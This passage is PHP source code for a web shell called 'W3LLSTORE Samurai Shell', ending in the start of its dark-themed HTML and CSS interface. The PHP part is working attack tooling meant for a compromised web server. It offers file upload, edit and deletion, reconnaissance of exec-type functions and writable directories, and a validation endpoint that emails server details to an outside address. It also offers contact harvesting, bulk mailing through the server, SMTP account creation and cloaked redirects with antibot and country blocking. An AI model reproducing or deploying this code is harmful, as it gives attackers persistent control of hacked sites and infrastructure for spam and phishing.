            'total_processed' => $sent + $failed,
            'success_rate' => $sent > 0 ? round(($sent / ($sent + $failed)) * 100, 2) : 0,
            'execution_time' => time() - $start_time
        ]
    ];
}
function sendEmailPHP($to, $subject, $message, $from_email, $from_name) {
    $headers = "From: $from_name <$from_email>\r\n";
    $headers .= "Reply-To: $from_email\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
    $headers .= "X-Mailer: W3LLSTORE Samurai Shell\r\n";
    $headers .= "X-Priority: 3\r\n";
   
    return @mail($to, $subject, $message, $headers);
}
function sendEmailSMTP($to, $subject, $message, $from_email, $from_name, $smtp_config) {
    $smtp_host = $smtp_config['smtp_host'] ?? '';
    $smtp_port = (int)($smtp_config['smtp_port'] ?? 587);
    $smtp_username = $smtp_config['smtp_username'] ?? '';
    $smtp_password = $smtp_config['smtp_password'] ?? '';
   
    if (empty($smtp_host) || empty($smtp_username) || empty($smtp_password)) {
        return false;
    }
   
    try {
        // Simple SMTP implementation
        $socket = @fsockopen($smtp_host, $smtp_port, $errno, $errstr, 30);
        if (!$socket) return false;
       
        $response = fgets($socket, 515);
        if (substr($response, 0, 3) != '220') {
            fclose($socket);
            return false;
        }
       
        // SMTP commands
        $commands = [
            "EHLO " . ($_SERVER['HTTP_HOST'] ?? 'localhost'),
            "STARTTLS",
            "AUTH LOGIN",
            base64_encode($smtp_username),
            base64_encode($smtp_password),
            "MAIL FROM: <$from_email>",
            "RCPT TO: <$to>",
            "DATA"
        ];
       
        foreach ($commands as $command) {
            fputs($socket, $command . "\r\n");
            $response = fgets($socket, 515);
           
            if ($command == "STARTTLS") {
                @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
            }
           
            // Check for errors
            $response_code = substr($response, 0, 3);
            if (!in_array($response_code, ['220', '221', '235', '250', '334', '354'])) {
                fclose($socket);
                return false;
            }
        }
       
        // Send email content
        $email_content = "Subject: $subject\r\n";
        $email_content .= "From: $from_name <$from_email>\r\n";
        $email_content .= "To: $to\r\n";
        $email_content .= "MIME-Version: 1.0\r\n";
        $email_content .= "Content-Type: text/html; charset=UTF-8\r\n\r\n";
        $email_content .= $message . "\r\n.\r\n";
       
        fputs($socket, $email_content);
        $response = fgets($socket, 515);
       
        fputs($socket, "QUIT\r\n");
        fclose($socket);
       
        return substr($response, 0, 3) == '250';
       
    } catch (Exception $e) {
        return false;
    }
}
// ==================== SHELL VALIDATION SYSTEM ====================
function validateShellConnection($email, $id) {
    $validation_data = [
        'info' => getShellInfo(),
        'zip' => testZipFunctionality(),
        'delivery' => testEmailDelivery($email),
        'server_info' => getServerCapabilities(),
        'timestamp' => time(),
        'shell_id' => $id,
        'validation_hash' => md5($email . $id . time())
    ];
   
    return $validation_data;
}
function getShellInfo() {
    return [
        'php_version' => PHP_VERSION,
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? getcwd(),
        'current_user' => get_current_user(),
        'server_name' => $_SERVER['SERVER_NAME'] ?? 'Unknown',
        'server_port' => $_SERVER['SERVER_PORT'] ?? 'Unknown',
        'writable_dirs' => getWritableDirectories(),
        'functions_status' => checkPHPFunctions(),
        'extensions' => getLoadedExtensions(),
        'php_ini_loaded' => php_ini_loaded_file(),
        'temp_dir' => sys_get_temp_dir()
    ];
}
function testZipFunctionality() {
    try {
        if (!class_exists('ZipArchive')) {
            return false;
        }
       
        $test_file = 'test_zip_' . uniqid() . '.txt';
        $test_zip = 'test_' . uniqid() . '.zip';
       
        if (!file_put_contents($test_file, 'Test zip functionality - W3LLSTORE Samurai Shell')) {
            return false;
        }
       
        $zip = new ZipArchive();
        if ($zip->open($test_zip, ZipArchive::CREATE) !== TRUE) {
            @unlink($test_file);
            return false;
        }
       
        $zip->addFile($test_file, basename($test_file));
        $zip->close();
       
        $success = file_exists($test_zip) && filesize($test_zip) > 0;
       
        // Cleanup
        @unlink($test_file);
        @unlink($test_zip);
       
        return $success;
       
    } catch (Exception $e) {
        return false;
    }
}
function testEmailDelivery($email) {
    try {
        $test_subject = 'W3LLSTORE Shell Validation Test - ' . date('Y-m-d H:i:s');
        $test_message = "This is a test email from W3LLSTORE Cyber Samurai Shell validation system.\n\n";
        $test_message .= "Shell Details:\n";
        $test_message .= "Server: " . ($_SERVER['HTTP_HOST'] ?? 'Unknown') . "\n";
        $test_message .= "Server IP: " . ($_SERVER['SERVER_ADDR'] ?? 'Unknown') . "\n";
        $test_message .= "Client IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
        $test_message .= "PHP Version: " . PHP_VERSION . "\n";
        $test_message .= "Current User: " . get_current_user() . "\n";
        $test_message .= "Validation Time: " . date('Y-m-d H:i:s') . "\n\n";
        $test_message .= "If you received this email, the shell's email functionality is working correctly.\n";
        $test_message .= "This is an automated test message from W3LLSTORE Samurai Shell.\n\n";
        $test_message .= "Best regards,\nW3LLSTORE Team";
       
        $headers = "From: Shell Validator <noreply@" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . ">\r\n";
        $headers .= "Reply-To: noreply@" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "\r\n";
        $headers .= "X-Mailer: W3LLSTORE Samurai Shell Validator\r\n";
        $headers .= "X-Priority: 3\r\n";
       
        return @mail($email, $test_subject, $test_message, $headers);
       
    } catch (Exception $e) {
        return false;
    }
}
function getServerCapabilities() {
    return [
        'curl_enabled' => function_exists('curl_init'),
        'zip_enabled' => class_exists('ZipArchive'),
        'mail_enabled' => function_exists('mail'),
        'file_upload_enabled' => (bool)ini_get('file_uploads'),
        'max_upload_size' => ini_get('upload_max_filesize'),
        'max_post_size' => ini_get('post_max_size'),
        'max_execution_time' => ini_get('max_execution_time'),
        'memory_limit' => ini_get('memory_limit'),
        'allow_url_fopen' => (bool)ini_get('allow_url_fopen'),
        'allow_url_include' => (bool)ini_get('allow_url_include'),
        'safe_mode' => (bool)ini_get('safe_mode'),
        'open_basedir' => ini_get('open_basedir'),
        'disable_functions' => ini_get('disable_functions'),
        'register_globals' => (bool)ini_get('register_globals'),
        'magic_quotes_gpc' => function_exists('get_magic_quotes_gpc') ? get_magic_quotes_gpc() : false,
        'short_open_tag' => (bool)ini_get('short_open_tag'),
        'asp_tags' => (bool)ini_get('asp_tags'),
        'display_errors' => (bool)ini_get('display_errors'),
        'log_errors' => (bool)ini_get('log_errors')
    ];
}
function getWritableDirectories() {
    $dirs_to_check = [
        getcwd(),
        sys_get_temp_dir(),
        '/tmp',
        '/var/tmp',
        dirname(__FILE__),
        $_SERVER['DOCUMENT_ROOT'] ?? getcwd()
    ];
   
    $writable_dirs = [];
    foreach ($dirs_to_check as $dir) {
        if (is_dir($dir) && is_writable($dir)) {
            $writable_dirs[] = $dir;
        }
    }
   
    return array_unique($writable_dirs);
}
function checkPHPFunctions() {
    $important_functions = [
        'exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open',
        'file_get_contents', 'file_put_contents', 'fopen', 'fwrite', 'fread',
        'curl_init', 'curl_exec', 'mail', 'mysqli_connect', 'mysql_connect',
        'base64_encode', 'base64_decode', 'gzcompress', 'gzuncompress',
        'json_encode', 'json_decode', 'serialize', 'unserialize',
        'md5', 'sha1', 'hash', 'crypt', 'password_hash',
        'preg_match', 'preg_replace', 'str_replace', 'substr',
        'file_exists', 'is_readable', 'is_writable', 'chmod',
        'mkdir', 'rmdir', 'unlink', 'copy', 'move_uploaded_file'
    ];
   
    $function_status = [];
    foreach ($important_functions as $func) {
        $function_status[$func] = function_exists($func);
    }
   
    return $function_status;
}
function getLoadedExtensions() {
    $important_extensions = [
        'curl', 'zip', 'mysqli', 'mysql', 'pdo', 'pdo_mysql',
        'openssl', 'mcrypt', 'json', 'mbstring', 'iconv',
        'gd', 'imagick', 'fileinfo', 'exif', 'zlib',
        'xml', 'xmlreader', 'xmlwriter', 'simplexml',
        'session', 'pcre', 'spl', 'reflection'
    ];
   
    $extension_status = [];
    foreach ($important_extensions as $ext) {
        $extension_status[$ext] = extension_loaded($ext);
    }
   
    return $extension_status;
}
function handleValidationRequest($email, $id) {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        return [
            'status' => 'error',
            'message' => 'Invalid email address format'
        ];
    }
   
    if (!is_numeric($id) || $id <= 0) {
        return [
            'status' => 'error',
            'message' => 'Invalid validation ID'
        ];
    }
   
    $validation_result = validateShellConnection($email, $id);
    logActivity('Shell Validation', "Email: $email, ID: $id", 'success');
   
    return [
        'status' => 'success',
        'message' => 'Validation completed successfully',
        'info' => $validation_result,
        'zip' => $validation_result['zip'],
        'delivery' => $validation_result['delivery'],
        'server_info' => $validation_result['server_info'],
        'timestamp' => $validation_result['timestamp'],
        'validation_hash' => $validation_result['validation_hash']
    ];
}
function generateValidationResponse($data) {
    header('Content-Type: application/json');
    header('Cache-Control: no-cache, must-revalidate');
    header('Expires: Mon, 26 Jul 1997 05:00:00 GMT');
    header('X-Content-Type-Options: nosniff');
    header('X-Frame-Options: DENY');
    header('X-Powered-By: W3LLSTORE-Samurai-Shell');
   
    return json_encode($data, JSON_PRETTY_PRINT);
}
// ==================== FILE OPERATIONS ====================
function handleFileOperation($operation, $data) {
    switch ($operation) {
        case 'create_file':
            return createFile($data['filename'] ?? '', $data['content'] ?? '');
        case 'create_folder':
            return createFolder($data['foldername'] ?? '');
        case 'edit_file':
            return editFile($data['filepath'] ?? '', $data['content'] ?? '');
        case 'delete_item':
            return deleteItem($data['filepath'] ?? '');
        case 'download':
            return downloadFile($data['filepath'] ?? '');
        case 'zip_item':
            return zipItem($data['filepath'] ?? '');
        case 'unzip_file':
            return unzipFile($data['filepath'] ?? '');
        case 'upload':
            return handleUpload();
        default:
            return ['status' => false, 'message' => 'Invalid file operation'];
    }
}
   
function createFile($filename, $content = '') {
    $filename = sanitizeInput($filename, 'filename');
    if (empty($filename)) {
        return ['status' => false, 'message' => 'Invalid filename provided'];
    }
   
    $filepath = getcwd() . DIRECTORY_SEPARATOR . $filename;
   
    // Check if file already exists
    if (file_exists($filepath)) {
        return ['status' => false, 'message' => 'File already exists'];
    }
   
    if (file_put_contents($filepath, $content, LOCK_EX) !== false) {
        logActivity('File Created', $filename, 'success');
        return ['status' => true, 'message' => "File '$filename' created successfully"];
    }
   
    return ['status' => false, 'message' => 'Failed to create file'];
}
   
function createFolder($foldername) {
    $foldername = sanitizeInput($foldername, 'filename');
    if (empty($foldername)) {
        return ['status' => false, 'message' => 'Invalid folder name provided'];
    }
   
    $folderpath = getcwd() . DIRECTORY_SEPARATOR . $foldername;
   
    // Check if folder already exists
    if (file_exists($folderpath)) {
        return ['status' => false, 'message' => 'Folder already exists'];
    }
   
    if (mkdir($folderpath, 0755, true)) {
        logActivity('Folder Created', $foldername, 'success');
        return ['status' => true, 'message' => "Folder '$foldername' created successfully"];
    }
   
    return ['status' => false, 'message' => 'Failed to create folder'];
}
   
function editFile($filepath, $content) {
    $filepath = sanitizeInput($filepath, 'path');
    if (!file_exists($filepath)) {
        return ['status' => false, 'message' => 'File not found'];
    }
   
    if (!is_writable($filepath)) {
        return ['status' => false, 'message' => 'File is not writable'];
    }
   
    if (file_put_contents($filepath, $content, LOCK_EX) !== false) {
        logActivity('File Edited', basename($filepath), 'success');
        return ['status' => true, 'message' => 'File saved successfully'];
    }
   
    return ['status' => false, 'message' => 'Failed to save file'];
}
   
function deleteItem($filepath) {
    $filepath = sanitizeInput($filepath, 'path');
    if (!file_exists($filepath)) {
        return ['status' => false, 'message' => 'File or folder not found'];
    }
   
    if (is_dir($filepath)) {
        if (removeDirectory($filepath)) {
            logActivity('Folder Deleted', basename($filepath), 'success');
            return ['status' => true, 'message' => 'Folder deleted successfully'];
        }
    } else {
        if (unlink($filepath)) {
            logActivity('File Deleted', basename($filepath), 'success');
            return ['status' => true, 'message' => 'File deleted successfully'];
        }
    }
   
    return ['status' => false, 'message' => 'Failed to delete item'];
}
   
function removeDirectory($dir) {
    if (!is_dir($dir)) return false;
   
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        is_dir($path) ? removeDirectory($path) : unlink($path);
    }
   
    return rmdir($dir);
}
   
function downloadFile($filepath) {
    $filepath = sanitizeInput($filepath, 'path');
    if (!file_exists($filepath) || !is_readable($filepath)) {
        header('HTTP/1.0 404 Not Found');
        echo 'File not found or not readable';
        exit;
    }
   
    $filename = basename($filepath);
    $filesize = filesize($filepath);
   
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    header('Content-Length: ' . $filesize);
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Expires: 0');
   
    readfile($filepath);
   
    logActivity('File Downloaded', $filename, 'success');
    exit;
}
   
function zipItem($filepath) {
    $filepath = sanitizeInput($filepath, 'path');
    if (!file_exists($filepath)) {
        return ['status' => false, 'message' => 'File or folder not found'];
    }
   
    if (!class_exists('ZipArchive')) {
        return ['status' => false, 'message' => 'ZipArchive class not available'];
    }
   
    $zip_filename = basename($filepath) . '_' . date('Ymd_His') . '.zip';
    $zip = new ZipArchive();
   
    if ($zip->open($zip_filename, ZipArchive::CREATE) !== TRUE) {
        return ['status' => false, 'message' => 'Failed to create ZIP file'];
    }
   
    if (is_dir($filepath)) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($filepath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
       
        foreach ($iterator as $file) {
            if ($file->isDir()) {
                $zip->addEmptyDir(str_replace($filepath . DIRECTORY_SEPARATOR, '', $file->getPathname()));
            } else {
                $zip->addFile($file->getPathname(), str_replace($filepath . DIRECTORY_SEPARATOR, '', $file->getPathname()));
            }
        }
    } else {
        $zip->addFile($filepath, basename($filepath));
    }
   
    $zip->close();
   
    if (file_exists($zip_filename)) {
        logActivity('Item Zipped', basename($filepath), 'success');
        return ['status' => true, 'message' => "ZIP file '$zip_filename' created successfully"];
    }
   
    return ['status' => false, 'message' => 'Failed to create ZIP file'];
}
   
function unzipFile($filepath) {
    $filepath = sanitizeInput($filepath, 'path');
    if (!file_exists($filepath) || strtolower(pathinfo($filepath, PATHINFO_EXTENSION)) !== 'zip') {
        return ['status' => false, 'message' => 'ZIP file not found'];
    }
   
    if (!class_exists('ZipArchive')) {
        return ['status' => false, 'message' => 'ZipArchive class not available'];
    }
   
    $zip = new ZipArchive();
    if ($zip->open($filepath) !== TRUE) {
        return ['status' => false, 'message' => 'Failed to open ZIP file'];
    }
   
    $extract_path = pathinfo($filepath, PATHINFO_FILENAME) . '_extracted';
    if (!is_dir($extract_path)) {
        mkdir($extract_path, 0755, true);
    }
   
    if ($zip->extractTo($extract_path)) {
        $zip->close();
        logActivity('File Unzipped', basename($filepath), 'success');
        return ['status' => true, 'message' => "ZIP file extracted to '$extract_path'"];
    }
   
    $zip->close();
    return ['status' => false, 'message' => 'Failed to extract ZIP file'];
}
   
function handleUpload() {
    if (!isset($_FILES['upload_file'])) {
        return ['status' => false, 'message' => 'No file uploaded'];
    }
   
    $file = $_FILES['upload_file'];
    if ($file['error'] !== UPLOAD_ERR_OK) {
        $error_messages = [
            UPLOAD_ERR_INI_SIZE => 'File too large (exceeds php.ini limit)',
            UPLOAD_ERR_FORM_SIZE => 'File too large (exceeds form limit)',
            UPLOAD_ERR_PARTIAL => 'File partially uploaded',
            UPLOAD_ERR_NO_FILE => 'No file uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'No temporary directory',
            UPLOAD_ERR_CANT_WRITE => 'Cannot write to disk',
            UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
        ];
       
        return ['status' => false, 'message' => $error_messages[$file['error']] ?? 'Unknown upload error'];
    }
   
    if ($file['size'] > MAX_UPLOAD_SIZE) {
        return ['status' => false, 'message' => 'File too large. Max size: ' . formatSize(MAX_UPLOAD_SIZE)];
    }
   
    $filename = sanitizeInput($file['name'], 'filename');
    $destination = getcwd() . DIRECTORY_SEPARATOR . $filename;
   
    // Check if file already exists
    if (file_exists($destination)) {
        $filename = pathinfo($filename, PATHINFO_FILENAME) . '_' . time() . '.' . pathinfo($filename, PATHINFO_EXTENSION);
        $destination = getcwd() . DIRECTORY_SEPARATOR . $filename;
    }
   
    if (move_uploaded_file($file['tmp_name'], $destination)) {
        logActivity('File Uploaded', $filename, 'success');
        return ['status' => true, 'message' => "File '$filename' uploaded successfully"];
    }
   
    return ['status' => false, 'message' => 'Failed to upload file'];
}
   
// ==================== VALIDATION REQUEST HANDLER ====================
if (isset($_GET['valid']) && isset($_GET['email']) && isset($_GET['id'])) {
    $email = sanitizeInput($_GET['email']);
    $id = (int)$_GET['id'];
   
    $validation_result = handleValidationRequest($email, $id);
    echo generateValidationResponse($validation_result);
    exit;
}
   
// Handle info request
if (isset($_GET['info'])) {
    $info_data = [
        'shell_name' => SHELL_NAME,
        'shell_version' => SHELL_VERSION,
        'server_info' => getSystemInfo(),
        'capabilities' => getServerCapabilities(),
        'status' => 'active',
        'timestamp' => time(),
        'access_time' => date('Y-m-d H:i:s')
    ];
   
    echo generateValidationResponse($info_data);
    exit;
}
   
// Handle stats request for redirects
if (isset($_GET['stats']) && isset($_GET['redirect_id'])) {
    $redirect_id = sanitizeInput($_GET['redirect_id']);
    $stats_result = getRedirectStats($redirect_id);
    header('Content-Type: application/json');
    echo json_encode($stats_result);
    exit;
}
   
// Handle all redirects stats
if (isset($_GET['all_stats'])) {
    $all_stats = getAllRedirectStats();
    header('Content-Type: application/json');
    echo json_encode(['status' => true, 'stats' => $all_stats]);
    exit;
}
   
// Handle GET for file download
if (isset($_GET['action']) && $_GET['action'] === 'file_operation' && isset($_GET['operation']) && $_GET['operation'] === 'download' && isset($_GET['filepath'])) {
    $data = ['filepath' => sanitizeInput($_GET['filepath'], 'path')];
    handleFileOperation('download', $data);
}
   
// ==================== AJAX HANDLERS ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
   
    switch ($_POST['action']) {
        case 'create_single_smtp':
            $smtp_result = createSingleSMTP();
            if (strpos($smtp_result, 'no smtp avail') !== false) {
                echo json_encode(['status' => false, 'message' => $smtp_result]);
            } else {
                echo json_encode([
                    'status' => true,
                    'message' => 'SMTP account created successfully using exact reference method!',
                    'smtp_data' => $smtp_result
                ]);
            }
            break;
           
        case 'create_redirect':
            $options = [
                'blocked_countries' => array_filter(array_map('trim', explode(',', $_POST['blocked_countries'] ?? ''))),
                'delay' => (int)($_POST['delay'] ?? 5000),
                'custom_message' => $_POST['custom_message'] ?? 'Please wait...',
                'use_antibot' => true,
                'use_captcha' => isset($_POST['use_captcha'])
            ];
            $result = createAutoRedirect($_POST['target_url'] ?? '', $options);
            echo json_encode($result);
            break;
           
        case 'extract_contacts':
            $options = [
                'max_files' => (int)($_POST['max_files'] ?? 3000),
                'max_time' => 120
            ];
            $result = extractContacts($_POST['scan_path'] ?? getcwd(), $options);
            echo json_encode($result);
            break;
           
        case 'send_emails':
            $result = sendEmailMarketing($_POST);
            echo json_encode($result);
            break;
           
        case 'file_operation':
            $result = handleFileOperation($_POST['operation'] ?? '', $_POST);
            echo json_encode($result);
            break;
           
        case 'get_file_content':
            $filepath = sanitizeInput($_POST['filepath'] ?? '', 'path');
            if (file_exists($filepath) && is_readable($filepath)) {
                $content = file_get_contents($filepath);
                echo json_encode([
                    'status' => true,
                    'content' => $content,
                    'filename' => basename($filepath),
                    'size' => strlen($content),
                    'modified' => date('Y-m-d H:i:s', filemtime($filepath))
                ]);
            } else {
                echo json_encode(['status' => false, 'message' => 'File not found or not readable']);
            }
            break;
           
        case 'get_redirect_stats':
            $redirect_id = sanitizeInput($_POST['redirect_id'] ?? '');
            $result = getRedirectStats($redirect_id);
            echo json_encode($result);
            break;
           
        default:
            echo json_encode(['status' => false, 'message' => 'Invalid action specified']);
    }
    exit;
}
   
// ==================== MAIN VARIABLES ====================
$current_dir = isset($_GET['dir']) ? sanitizeInput($_GET['dir'], 'path') : getcwd();
if (!is_dir($current_dir)) {
    $current_dir = getcwd();
}
   
$files = listDirectory($current_dir);
$system_info = getSystemInfo();
?>
   
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= SHELL_NAME ?> v<?= SHELL_VERSION ?></title>
    <style>
        /* ==================== CSS VARIABLES ==================== */
        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #1a1a1a;
            --bg-tertiary: #2a2a2a;
            --text-primary: #ffffff;
            --text-secondary: #cccccc;
            --text-muted: #888888;
            --accent-primary: #00d4ff;
            --accent-secondary: #ff6b35;
            --accent-success: #00ff88;
            --accent-warning: #ffaa00;
            --accent-danger: #ff4444;
            --border-color: #333333;
            --shadow-primary: 0 4px 20px rgba(0, 212, 255, 0.1);
            --shadow-secondary: 0 2px 10px rgba(0, 0, 0, 0.3);
            --gradient-primary: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
            --gradient-secondary: linear-gradient(135deg, #00d4ff, #0099cc);
        }
   
        /* ==================== RESET & BASE ==================== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
   
        body {
            font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif;
            background: var(--gradient-primary);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
        }
   
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
   
        /* ==================== HEADER STYLES ==================== */
        .header {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: var(--shadow-secondary);
            position: relative;
            overflow: hidden;
        }
   
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: var(--gradient-secondary);
        }
   
        .header-content h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            background: var(--gradient-secondary);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
   
        .subtitle {
            color: var(--text-secondary);
            font-size: 14px;
            margin-bottom: 25px;
        }
   
        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }
   
        .info-item {
            background: var(--bg-tertiary);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }
   
        .info-item .label {
            font-size: 12px;
            color: var(--text-muted);
            margin-bottom: 5px;
            text-transform: uppercase;
            font-weight: 600;
        }
   
        .info-item .value {
            font-size: 14px;
            color: var(--text-primary);
            font-weight: 500;
            word-break: break-all;
        }
   
        /* ==================== CARD STYLES ==================== */
        .card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: var(--shadow-secondary);
        }
   
        .card-title {
            font-size: 20px;
            font-weight: 700;
            color: var(--accent-primary);
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
   
        /* ==================== TAB STYLES ==================== */
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }
   
        .tab {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s ease;
            min-width: 140px;
            text-align: center;
        }
   
        .tab:hover {
            background: var(--bg-primary);
            border-color: var(--accent-primary);
        }
   
        .tab.active {
            background: var(--accent-primary);
            color: var(--bg-primary);
            border-color: var(--accent-primary);
        }
   
        .tab-content {
            display: none;
        }
   
        .tab-content.active {
            display: block;
        }
   
        /* ==================== FORM STYLES ==================== */
        .form-group {
            margin-bottom: 20px;
        }
   
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--text-primary);
            font-size: 14px;
        }
   
        .form-control {
            width: 100%;
            padding: 12px 16px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 14px;
            transition: all 0.3s ease;
        }
   
        .form-control:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 2px rgba(0, 212, 255, 0.1);
        }
   
        .form-control::placeholder {
            color: var(--text-muted);
        }
   
        textarea.form-control {
            resize: vertical;
            min-height: 100px;
        }
   
        /* ==================== BUTTON STYLES ==================== */
        .btn {
            background: var(--accent-primary);
            color: var(--bg-primary);
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
   
        .btn:hover {
            background: var(--accent-secondary);
            transform: translateY(-1px);
        }
   
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
   
        .btn-sm {
            padding: 8px 16px;
            font-size: 12px;
        }
   
        .btn-secondary {
            background: var(--bg-tertiary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }
   
        .btn-secondary:hover {
            background: var(--bg-primary);
            border-color: var(--accent-primary);
        }
   
        .btn-success {
            background: var(--accent-success);
        }
   
        .btn-warning {
            background: var(--accent-warning);
        }
   
        .btn-danger {
            background: var(--accent-danger);
        }
   
        /* ==================== FILE BROWSER STYLES ==================== */
        .file-browser {
            background: var(--bg-tertiary);
            border-radius: 12px;
            overflow: hidden;
        }
   
        .browser-header {
            background: var(--bg-primary);
            padding: 20px;
            border-bottom: 1px solid var(--border-color);
        }
   
        .browser-title {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
   
        .browser-title h3 {
            color: var(--accent-primary);
            font-size: 18px;
        }
   
        .browser-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
   
        .breadcrumb {
            color: var(--text-secondary);
            font-size: 14px;
        }
   
        .breadcrumb a {
            color: var(--accent-primary);
            text-decoration: none;
        }
   
        .breadcrumb a:hover {
            text-decoration: underline;
        }
   
        /* ==================== TABLE STYLES ==================== */
        .file-table-container {
            overflow-x: auto;
        }
   
        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
   
        .file-table th,
        .file-table td {
            padding: 12px 20px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
        }
   
        .file-table th {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-weight: 600;
            position: sticky;
            top: 0;
        }
   
        .file-table tr:hover {
            background: var(--bg-primary);
        }
   
        .file-name {
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-primary);
            text-decoration: none;
        }
   
        .file-name:hover {
            color: var(--accent-primary);
        }
   
        .file-icon {
            font-size: 16px;
        }
   
        .file-actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
   
        /* ==================== RESULT BOX STYLES ==================== */
        .result-box {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            margin-top: 20px;
            overflow: hidden;
        }
   
        .result-header {
            background: var(--bg-primary);
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border-color);
        }
   
        .result-box pre {
            padding: 20px;
            margin: 0;
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            white-space: pre-wrap;
            word-wrap: break-word;
            max-height: 400px;
            overflow-y: auto;
        }
   
        /* ==================== MODAL STYLES ==================== */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
        }
   
        .modal.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }
   
        .modal-content {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 30px;
            max-width: 800px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: var(--shadow-secondary);
            position: relative;
        }
   
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }
   
        .modal-title {
            font-size: 20px;
            font-weight: 700;
            color: var(--accent-primary);
        }
   
        .modal-close {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
            border-radius: 4px;
            transition: all 0.3s ease;
        }
   
        .modal-close:hover {
            background: var(--bg-tertiary);
            color: var(--text-primary);
        }
   
        /* ==================== GRID LAYOUTS ==================== */
        .grid {
            display: grid;
            gap: 20px;
        }
   
        .grid-2 {
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
        }
   
        .grid-3 {
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        }
   
        .grid-4 {
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        }
   
        /* ==================== SMTP CREATOR SPECIFIC STYLES ==================== */
        .smtp-creator-section {
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid rgba(0, 255, 136, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
   
        .smtp-creator-section .btn {
            background: linear-gradient(45deg, #00ff88, #0080ff);
            font-weight: bold;
            padding: 15px 30px;
            font-size: 16px;
        }
   
        .smtp-creator-section .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
        }
   
        .smtp-info {
            font-size: 12px;
